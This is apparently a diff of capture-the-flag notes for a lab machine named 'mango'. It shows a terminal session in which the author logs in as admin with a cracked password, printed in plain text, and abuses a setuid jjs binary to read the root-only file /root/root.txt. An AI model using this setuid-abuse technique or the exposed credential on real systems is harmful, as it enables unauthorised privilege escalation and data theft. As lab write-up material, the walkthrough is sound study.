@@ -298,4 +298,57 @@ mango@mango:~$
 // found "/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs"     
 // refer: https://gtfobins.github.io/gtfobins/jjs/
 
+mango@mango:~$ cd /usr/lib/jvm/java-11-openjdk-amd64/bin
+mango@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ ls -la
+total 188
+drwxr-xr-x 2 root root    4096 Sep 27  2019 .
+drwxr-xr-x 7 root root    4096 Sep 27  2019 ..
+-rwxr-xr-x 1 root root   10296 Jul 18  2019 java
+-rwsr-sr-- 1 root admin  10352 Jul 18  2019 jjs
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 keytool
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 pack200
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmid
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmiregistry
+-rwxr-xr-x 1 root root  107408 Jul 18  2019 unpack200
+mango@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ cd jjs
+-bash: cd: jjs: Not a directory
+mango@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ su - admin
+Password:         // this is the admin password that we cracked before   " t9KcS3>!0B#2 "
+$ 
+$ 
+$ pwd^?^?^?^?
+-su: 3: pwd: not found
+$ pwd
+/home/admin
+$ whoami
+admin
+$ cat us	^?^?^C
+$ ^C
+$ cat^?
+-su: 6: cat: not found
+$ ls -la
+total 40
+drwxr-xr-x 4 admin admin 4096 Apr  3 04:38 .
+drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
+lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
+drwx------ 2 admin admin 4096 Apr  3 04:19 .gnupg
+-rw-rw-r-- 1 root  admin 4486 Apr  3 06:20 .jjs.history
+drwxrwxr-x 3 admin admin 4096 Apr  3 04:38 .local
+-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
+-r-------- 1 admin admin   33 Sep 27  2019 user.txt
+$ cat user.txt
 
+$ pwd
+/home/admin
+$ jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> 
+jjs> 
+var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }
+
+// got root.txt by using jjs file-reader
